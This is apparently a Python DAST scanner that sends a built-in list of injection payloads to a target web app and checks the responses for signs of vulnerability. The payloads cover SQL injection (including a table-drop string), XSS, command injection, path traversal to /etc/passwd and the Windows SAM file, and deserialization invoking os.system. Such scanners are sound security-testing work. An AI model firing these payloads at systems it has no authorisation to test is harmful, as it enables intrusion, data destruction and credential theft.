"""DAST tester for dynamic vulnerability testing."""

from dataclasses import dataclass, field
from typing import Any

import httpx


@dataclass
class TestPayload:
    """Represents a test payload for vulnerability testing."""

    value: str
    cwe_id: str
    description: str


@dataclass
class TestResult:
    """Result of a vulnerability test."""

    vulnerability_id: str
    exploitable: bool
    evidence: str
    http_status: int | None = None
    response_time_ms: float | None = None
    test_payload: str | None = None
    notes: str = ""


class PayloadGenerator:
    """Generates test payloads based on CWE type."""

    def __init__(self) -> None:
        """Initialize the payload generator."""
        self._payloads: dict[str, list[TestPayload]] = {
            # SQL Injection (CWE-89)
            "CWE-89": [
                TestPayload(
                    value="' OR '1'='1",
                    cwe_id="CWE-89",
                    description="Basic SQL injection bypass",
                ),
                TestPayload(
                    value="1; DROP TABLE users--",
                    cwe_id="CWE-89",
                    description="SQL injection with table drop attempt",
                ),
                TestPayload(
                    value="' UNION SELECT NULL--",
                    cwe_id="CWE-89",
                    description="Union-based SQL injection",
                ),
                TestPayload(
                    value="1' AND '1'='1",
                    cwe_id="CWE-89",
                    description="Boolean-based SQL injection",
                ),
                TestPayload(
                    value="'; WAITFOR DELAY '0:0:5'--",
                    cwe_id="CWE-89",
                    description="Time-based blind SQL injection",
                ),
            ],
            # XSS (CWE-79)
            "CWE-79": [
                TestPayload(
                    value="<script>alert(1)</script>",
                    cwe_id="CWE-79",
                    description="Basic XSS script injection",
                ),
                TestPayload(
                    value='"><img src=x onerror=alert(1)>',
                    cwe_id="CWE-79",
                    description="XSS via img tag error handler",
                ),
                TestPayload(
                    value="javascript:alert(1)",
                    cwe_id="CWE-79",
                    description="JavaScript protocol XSS",
                ),
                TestPayload(
                    value="<svg onload=alert(1)>",
                    cwe_id="CWE-79",
                    description="XSS via SVG onload",
                ),
            ],
            # Command Injection (CWE-78)
            "CWE-78": [
                TestPayload(
                    value="; ls -la",
                    cwe_id="CWE-78",
                    description="Command injection with semicolon",
                ),
                TestPayload(
                    value="| cat /etc/passwd",
                    cwe_id="CWE-78",
                    description="Command injection with pipe",
                ),
                TestPayload(
                    value="$(whoami)",
                    cwe_id="CWE-78",
                    description="Command substitution injection",
                ),
                TestPayload(
                    value="`id`",
                    cwe_id="CWE-78",
                    description="Backtick command injection",
                ),
            ],
            # Path Traversal (CWE-22)
            "CWE-22": [
                TestPayload(
                    value="../../../etc/passwd",
                    cwe_id="CWE-22",
                    description="Unix path traversal to passwd",
                ),
                TestPayload(
                    value="....//....//....//etc/passwd",
                    cwe_id="CWE-22",
                    description="Path traversal with filter bypass",
                ),
                TestPayload(
                    value="..\\..\\..\\windows\\system32\\config\\sam",
                    cwe_id="CWE-22",
                    description="Windows path traversal",
                ),
                TestPayload(
                    value="/etc/passwd%00.jpg",
                    cwe_id="CWE-22",
                    description="Null byte path traversal",
                ),
            ],
            # Deserialization (CWE-502)
            "CWE-502": [
                TestPayload(
                    value='{"__class__": "os.system", "args": ["id"]}',
                    cwe_id="CWE-502",
                    description="JSON deserialization attack",
                ),
                TestPayload(
                    value="O:8:\"stdClass\":0:{}",
                    cwe_id="CWE-502",
                    description="PHP serialized object",
                ),
            ],
        }

        # Generic payloads for unknown CWEs
        self._generic_payloads = [
            TestPayload(
                value="{{7*7}}",
                cwe_id="GENERIC",
                description="Template injection test",
            ),
            TestPayload(
                value="${7*7}",
                cwe_id="GENERIC",
                description="Expression language injection",
            ),
            TestPayload(
                value="AAAA%n%n%n%n",
                cwe_id="GENERIC",
                description="Format string test",
            ),
        ]

    def get_payloads(self, cwe_id: str) -> list[TestPayload]:
        """Get payloads for a specific CWE.

        Args:
            cwe_id: The CWE identifier (e.g., "CWE-89").

        Returns:
            List of test payloads for the CWE, or generic payloads if unknown.
        """
        payloads = self._payloads.get(cwe_id, [])
        if payloads:
            return payloads
        return self._generic_payloads


class DASTTester:
    """Dynamic Application Security Tester.

    Executes HTTP requests with malicious payloads to test for vulnerabilities.
    """

    def __init__(
        self,
        target_url: str,
        timeout: float = 30.0,
    ) -> None:
        """Initialize the DAST tester.

        Args:
            target_url: Base URL of the target application.
            timeout: HTTP request timeout in seconds.
        """
        self.target_url = target_url
        self.timeout = timeout
        self.payload_generator = PayloadGenerator()

    async def _make_request(
        self,
        method: str,
        path: str,
        payload: str,
        **kwargs: Any,
    ) -> httpx.Response:
        """Make an HTTP request to the target.

        Args:
            method: HTTP method (GET, POST, etc.).
            path: URL path to request.
            payload: Payload to include in the request.
            **kwargs: Additional arguments for httpx.

        Returns:
            HTTP response object.
        """
        url = f"{self.target_url.rstrip('/')}/{path.lstrip('/')}"

        async with httpx.AsyncClient(timeout=self.timeout) as client:
            if method.upper() == "GET":
                response = await client.get(url, params={"q": payload}, **kwargs)
            else:
                response = await client.request(
                    method,
                    url,
                    data={"input": payload},
                    **kwargs,
                )
        return response

    def _detect_sql_injection(
        self,
        response: httpx.Response | Any,
    ) -> tuple[bool, str]:
        """Detect SQL injection vulnerability from response.

        Args:
            response: HTTP response to analyze.

        Returns:
            Tuple of (exploitable, evidence).
        """
        sql_error_patterns = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "pg_query():",
            "pg_exec():",
            "sqlite3.operationalerror",
            "ora-00933",
            "ora-01756",
            "microsoft ole db provider for sql server",
            "odbc sql server driver",
            "sqlstate",
            "jdbc exception",
        ]

        response_text = response.text.lower()

        for pattern in sql_error_patterns:
            if pattern in response_text:
                return True, f"SQL error detected: {pattern}"

        return False, ""

    def _detect_xss_reflection(
        self,
        response: httpx.Response | Any,
        payload: str,
    ) -> tuple[bool, str]:
        """Detect XSS reflection in response.

        Args:
            response: HTTP response to analyze.
            payload: The XSS payload that was sent.

        Returns:
            Tuple of (exploitable, evidence).
        """
        if payload in response.text:
            return True, f"Payload reflected in response: {payload}"

        return False, ""

    def _detect_path_traversal(
        self,
        response: httpx.Response | Any,
    ) -> tuple[bool, str]:
        """Detect path traversal vulnerability from response.

        Args:
            response: HTTP response to analyze.

        Returns:
            Tuple of (exploitable, evidence).
        """
        path_traversal_indicators = [
            "root:x:0:0:",  # Unix passwd file
            "root:*:0:0:",  # BSD passwd format
            "[boot loader]",  # Windows boot.ini
            "[operating systems]",
            "\\windows\\system32",
            "/etc/passwd",
            "daemon:x:",
        ]

        response_text = response.text.lower()

        for indicator in path_traversal_indicators:
            if indicator.lower() in response_text:
                return True, f"Path traversal detected: found {indicator}"

        return False, ""

    def _detect_command_injection(
        self,
        response: httpx.Response | Any,
    ) -> tuple[bool, str]:
        """Detect command injection vulnerability from response.

        Args:
            response: HTTP response to analyze.

        Returns:
            Tuple of (exploitable, evidence).
        """
        command_output_patterns = [
            "uid=",  # id command output
            "gid=",
            "groups=",
            "total ",  # ls output
            "drwx",  # ls -la output
            "-rw-",
            "root:x:0:0",  # passwd content
            "bin:x:1:1",
        ]

        response_text = response.text

        for pattern in command_output_patterns:
            if pattern in response_text:
                return True, f"Command injection detected: found {pattern}"

        return False, ""

    async def test_vulnerability(
        self,
        vulnerability: dict[str, Any],
    ) -> TestResult:
        """Test a specific vulnerability.

        Args:
            vulnerability: Vulnerability dict from VULNERABILITIES.json.

        Returns:
            TestResult with exploitation status and evidence.
        """
        vuln_id = vulnerability.get("id", "UNKNOWN")
        cwe_id = vulnerability.get("cwe_id", "")
        file_path = vulnerability.get("file_path", "")

        # Get payloads for this CWE type
        payloads = self.payload_generator.get_payloads(cwe_id)

        # Try each payload
        for payload in payloads:
            try:
                response = await self._make_request(
                    method="GET",
                    path=file_path,
                    payload=payload.value,
                )

                # Check for vulnerability indicators based on CWE
                exploitable = False
                evidence = ""

                if cwe_id == "CWE-89":
                    exploitable, evidence = self._detect_sql_injection(response)
                elif cwe_id == "CWE-79":
                    exploitable, evidence = self._detect_xss_reflection(
                        response,
                        payload.value,
                    )
                elif cwe_id == "CWE-78":
                    exploitable, evidence = self._detect_command_injection(response)
                elif cwe_id == "CWE-22":
                    exploitable, evidence = self._detect_path_traversal(response)

                if exploitable:
                    return TestResult(
                        vulnerability_id=vuln_id,
                        exploitable=True,
                        evidence=evidence,
                        http_status=response.status_code,
                        response_time_ms=response.elapsed.total_seconds() * 1000,
                        test_payload=payload.value,
                        notes=f"{cwe_id} confirmed via {payload.description}",
                    )

            except httpx.HTTPError:
                # Continue to next payload on HTTP errors
                continue

        # No exploitation detected
        return TestResult(
            vulnerability_id=vuln_id,
            exploitable=False,
            evidence="No exploitation indicators detected",
            notes=f"Tested {len(payloads)} payloads for {cwe_id}",
        )
